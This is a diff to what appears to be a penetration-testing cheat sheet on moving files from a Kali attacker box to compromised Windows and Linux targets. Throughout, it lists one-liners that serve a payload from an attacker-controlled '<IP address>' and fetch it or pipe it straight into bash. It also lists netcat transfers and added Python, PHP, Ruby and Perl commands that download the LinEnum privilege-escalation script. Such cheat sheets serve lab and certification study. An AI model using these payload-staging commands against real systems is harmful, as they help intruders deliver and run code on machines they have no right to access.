@@ -793,7 +793,7 @@ C:\> nc.exe -nlvp 443 < file.txt
 $ nc -nv <IP address> 443 > file.txt
 ```
 
-- Python Server 3 (Kali -> Windows/Kali)
+- Python3 Server (Kali -> Windows/Kali)
 
 ```
 $ python3 -m http.server 8000
@@ -802,13 +802,25 @@ $ curl http://<IP address>:8000/exploit.sh -o exploit.sh
 $ curl http://<IP address>:8000/exploit.sh | bash
 ```
 
-- Python Server 2.7 (Kali -> Windows/Kali)
+- Python3 Downloads (Kali -> Linux)
+
+```
+$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+
+- Python2.7 Server (Kali -> Windows/Kali)
 
 ```
 $ python2.7 -m SimpleHTTPServer 8000
 $ wget http://<IP address>:8000/exploit.sh -O exploit.sh
 $ curl http://<IP address>:8000/exploit.sh -o exploit.sh
 $ curl http://<IP address>:8000/exploit.sh | bash
+```
+
+- Python2.7 Downloads (Kali -> Linux)
+
+```
+$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
 
 - PHP Server (Kali -> Linux)
@@ -818,7 +830,15 @@ $ php -S 0.0.0.0:8000
 $ wget http://<IP address>:8000/exploit.sh -O exploit.sh
 $ curl http://<IP address>:8000/exploit.sh -o exploit.sh
 $ curl http://<IP address>:8000/exploit.sh | bash
+```
+
+- PHP Downloads (Kali -> Linux)
+
+```
 $ php -r '$file = file_get_contents("http://<IP address>:8000/exploit.sh"); file_put_contents("exploit.sh",$file);'
+$ php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
 
 - Ruby Server (Kali -> Linux)
@@ -828,6 +848,18 @@ $ ruby -run -ehttpd . -p8000
 $ wget http://<IP address>:8000/exploit.sh -O exploit.sh
 $ curl http://<IP address>:8000/exploit.sh -o exploit.sh
 $ curl http://<IP address>:8000/exploit.sh | bash
+```
+
+- Ruby Downloads (Kali -> Linux)
+
+```
+$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+```
+
+- Perl Downloads (Kali -> Linux)
+
+```
+$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
 ```
 
 - SCP Downloads (Kali -> Windows)
